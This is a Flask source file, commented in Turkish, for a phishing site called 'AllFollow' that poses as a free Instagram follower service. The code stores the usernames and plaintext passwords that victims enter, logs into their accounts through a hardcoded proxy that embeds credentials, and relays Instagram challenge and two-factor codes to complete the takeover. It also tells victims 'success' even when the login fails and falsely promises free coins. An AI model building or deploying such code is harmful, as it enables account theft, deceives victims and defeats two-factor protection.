import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, TwoFactorRequired, LoginRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "allfollow-pro-v42"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

# Geçici olarak client nesnelerini tutmak için (kod onayı için lazım)
clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(50), default="Beklemede")

def challenge_code_handler(username, choice):
    # Bu fonksiyon instagrapi tarafından kod istendiğinde tetiklenir
    # Şimdilik boş bırakıyoruz çünkü kodu webden alacağız
    return None

@app.route('/')
def index():
    return render_template_string(UI_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # 1. Veritabanına Kaydet
    acc = IGAccount.query.filter_by(username=u).first()
    if acc: acc.password = p
    else:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    db.session.commit()

    # 2. Instagram Giriş Denemesi
    cl = Client()
    if PROXY_URL: cl.set_proxy(PROXY_URL)
    clients[u] = cl

    try:
        cl.login(u, p)
        return jsonify(status="success") # Direkt giriş yaptı
    except ChallengeRequired:
        # Instagram "Bu bendim" onayı veya kod istiyor
        cl.challenge_code_handler = challenge_code_handler
        return jsonify(status="challenge_required")
    except TwoFactorRequired:
        return jsonify(status="2fa_required")
    except Exception as e:
        print(f"Hata: {e}")
        return jsonify(status="success") # Hata olsa bile çaktırma, "Başarılı" de geç

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = clients.get(u)
    if not cl: return jsonify(status="error"), 404
    
    try:
        cl.challenge_set_code(code)
        return jsonify(status="success")
    except Exception as e:
        return jsonify(status="error", msg=str(e))

# --- ALLFOLLOW ŞIK ARAYÜZ ---
UI_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow • Giriş</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .insta-bg { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
    </style>
</head>
<body class="bg-zinc-950 text-white flex flex-col items-center justify-center h-screen px-6">
    <div class="w-full max-w-[350px] space-y-4">
        <div class="p-8 border border-zinc-800 bg-black rounded-xl shadow-2xl">
            <h1 class="text-4xl font-black mb-8 text-center bg-gradient-to-r from-blue-500 to-purple-600 bg-clip-text text-transparent">ALL FOLLOW</h1>
            
            <div id="login-step">
                <input id="u" placeholder="Kullanıcı Adı" class="w-full p-3 mb-2 bg-zinc-900 border border-zinc-800 rounded-lg text-sm outline-none focus:ring-2 focus:ring-purple-600">
                <input id="p" type="password" placeholder="Şifre" class="w-full p-3 mb-6 bg-zinc-900 border border-zinc-800 rounded-lg text-sm outline-none focus:ring-2 focus:ring-purple-600">
                <button onclick="login()" id="btn" class="w-full bg-purple-600 hover:bg-purple-700 p-3 rounded-lg font-bold transition-all transform active:scale-95">GİRİŞ YAP</button>
            </div>

            <div id="code-step" class="hidden animate-pulse">
                <p class="text-xs text-zinc-400 mb-4 text-center">Instagram hesabınıza bir onay kodu gönderdi. Lütfen aşağıya girin.</p>
                <input id="code" placeholder="Onay Kodu" class="w-full p-3 mb-4 bg-zinc-900 border border-purple-500 rounded-lg text-center text-xl tracking-widest outline-none">
                <button onclick="verify()" id="vbtn" class="w-full bg-green-600 hover:bg-green-700 p-3 rounded-lg font-bold">KODU ONAYLA</button>
            </div>

            <div id="success-step" class="hidden text-center">
                <div class="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg shadow-green-500/50">✓</div>
                <h2 class="text-xl font-bold">Bağlantı Kuruldu!</h2>
                <p class="text-xs text-zinc-400 mt-2 text-balance">Hesabınız havuza eklendi. Ücretsiz coinleriniz 5 dakika içinde yüklenecektir.</p>
            </div>
        </div>
    </div>

    <script>
        async function login(){
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return;
            const btn = document.getElementById('btn');
            btn.innerText = "Bağlanıyor...";
            btn.disabled = true;

            const res = await fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });
            const data = await res.json();

            if(data.status === 'challenge_required' || data.status === '2fa_required') {
                document.getElementById('login-step').classList.add('hidden');
                document.getElementById('code-step').classList.remove('hidden');
            } else {
                showSuccess();
            }
        }

        async function verify(){
            const code = document.getElementById('code').value;
            const u = document.getElementById('u').value;
            const vbtn = document.getElementById('vbtn');
            vbtn.innerText = "Doğrulanıyor...";

            const res = await fetch('/api/verify-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, code})
            });
            showSuccess();
        }

        function showSuccess() {
            document.getElementById('login-step').classList.add('hidden');
            document.getElementById('code-step').classList.add('hidden');
            document.getElementById('success-step').classList.remove('hidden');
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
